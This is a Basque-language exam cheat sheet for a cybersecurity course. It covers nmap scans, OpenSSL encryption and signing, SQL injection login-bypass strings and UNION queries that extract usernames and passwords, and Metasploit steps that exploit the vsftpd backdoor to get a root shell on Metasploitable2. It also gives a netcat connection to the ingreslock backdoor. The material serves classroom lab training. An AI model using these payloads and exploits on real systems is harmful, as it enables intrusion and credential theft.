# ⚡ Zibersegurtasuna - 1. Ebaluazioko Azterketa Praktikoa: Txuleta Azkarra

> **Helburua:** Azterketa praktikoan behar dituzun agindu nagusi guztiak orrialde bakarrean, bilaketa azkarretarako eta akatsak saihesteko.

---

## 1. 🔍 NMAP (Ataka eta Zerbitzuen Miaketa)

```bash
# 1. Sareko ekipo biziak bilatu (Ping Sweep)
nmap -sn 192.168.1.0/24

# 2. Ataka GUZTIAK (1-65535) modu azkarrean miatu
nmap -p- -T4 192.168.1.50

# 3. Zerbitzuen bertsio zehatzak eta script lehenetsiak ataka jakinetan
nmap -sV -sC -p 21,22,80,139,445,3306,3632 192.168.1.50

# 4. Sistema Eragilea (OS) eta aztarnak
nmap -O 192.168.1.50

# 5. Zaurgarritasun ezagunak aztertu NSE scriptekin
nmap --script=vuln -p 21,80,445,3632 192.168.1.50

# 6. Emaitza guztiak fitxategietan gorde (normala, xml, grepable)
nmap -p- -sV -sC -O -oA azterketa_eskaneoa 192.168.1.50
```

---

## 2. 🔐 OPENSSL (Kriptografia Simetrikoa eta Asimetrikoa)

### A. Zifratze Simetrikoa (AES-256-CBC)
```bash
# Zifratu (gatza gehituz eta base64z kodetuz):
openssl enc -aes-256-cbc -salt -pbkdf2 -in sekretua.txt -out sekretua.enc -a

# Deszifratu:
openssl enc -d -aes-256-cbc -pbkdf2 -in sekretua.enc -out berreskuratua.txt -a
```

### B. Zifratze Asimetrikoa (RSA 2048)
```bash
# 1. Gako pribatua sortu (2048 bit):
openssl genrsa -out gako_pribatua.pem 2048

# 2. Gako publikoa atera:
openssl rsa -in gako_pribatua.pem -pubout -out gako_publikoa.pem

# 3. Zifratu (Bob-en gako PUBLIKOAREKIN):
openssl pkeyutl -encrypt -pubin -inkey gako_publikoa.pem -in mezu_laburra.txt -out zifratua.bin

# 4. Deszifratu (Bob-en gako PRIBATUAREKIN):
openssl pkeyutl -decrypt -inkey gako_pribatua.pem -in zifratua.bin -out mezua_argi.txt
```

### C. Sinadura Digitala (Integritatea eta No-Repudio)
```bash
# 1. Sinatu (dokumentuaren hash-a egilearen gako PRIBATUAREKIN zifratuz):
openssl dgst -sha256 -sign gako_pribatua.pem -out sinadura.bin dokumentua.pdf

# 2. Egiaztatu (egilearen gako PUBLIKOAREKIN):
openssl dgst -sha256 -verify gako_publikoa.pem -signature sinadura.bin dokumentua.pdf
# -> "Verified OK" agertu behar da
```

### D. Hash-ak eta Fitxategien Osotasuna
```bash
sha256sum fitxategia.iso > kontrola.sha256
sha256sum -c kontrola.sha256  # "fitxategia.iso: OK"
```

---

## 3. 💉 SQL INJECTION (SQLi)

### A. Autentifikazioa Saihestea (Login Bypass)
* Erabiltzaile izena: `' OR '1'='1`
* Pasahitza: `' OR '1'='1`
* Edo iruzkinarekin: `admin' -- ` edo `admin' #`

### B. UNION Injekzioaren Pausoak
```sql
-- 1. Zutabe kopurua asmatu:
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -  (errorea eman arte)

-- 2. Datuak bistaratzen diren zutabeak aurkitu:
' UNION SELECT 1, 2, 3-- -

-- 3. Datu-basea eta bertsioa atera:
' UNION SELECT 1, version(), database()-- -

-- 4. Taulak zerrendatu (MySQL information_schema):
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()-- -

-- 5. Zutabeak zerrendatu:
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'-- -

-- 6. Pasahitzak eta erabiltzaileak erauzi:
' UNION SELECT 1, username, password FROM users-- -
```

### C. Konponbidea (PHP PDO Kontsulta Prestatuak)
```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :u AND password = :p');
$stmt->execute(['u' => $username, 'p' => $hashed_pass]);
$user = $stmt->fetch();
```

---

## 4. 💣 METASPLOIT FRAMEWORK (Ustiapen Praktikoa)

```bash
# 1. Metasploit abiarazi:
msfconsole -q

# 2. Exploit bilatu eta hautatu:
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor

# 3. Parametroak ikusi eta ezarri:
show options
set RHOSTS 192.168.1.50
set LHOST 192.168.1.20   # Zure IPa (Kali)

# 4. Exekutatu:
exploit

# 5. Saio barruan:
getuid          # (Meterpreter-en uneko erabiltzailea)
sysinfo         # Sistemaren informazioa
shell           # Linuxeko shell arruntera pasa (/bin/sh)
python -c 'import pty; pty.spawn("/bin/bash")' # TTY interaktiboa
whoami          # Linux shell-ean
shutdown -h now # Makina itzaltzeko
```

---

## 5. 🎯 KLASEKO PORTU ETA AHULTASUN TIPISENAK (Metasploitable2)

| Portua | Zerbitzua | Ahultasun Nagusia | Metasploit Modulua |
| :--- | :--- | :--- | :--- |
| **21/tcp** | vsftpd 2.3.4 | Atzeko atea (Backdoor `:)`) | `exploit/unix/ftp/vsftpd_234_backdoor` |
| **139, 445**| Samba 3.0.20 | Usermap script RCE | `exploit/multi/samba/usermap_script` |
| **3632/tcp**| distccd | Konpilazio irekiko RCE | `exploit/unix/misc/distcc_exec` |
| **80/tcp** | HTTP / DVWA | SQL Injekzioa / RCE | Nabigatzailea / sqlmap |
| **1524/tcp**| Ingreslock | Root backdoor irekia | `nc 192.168.1.50 1524` (zuzenean root) |
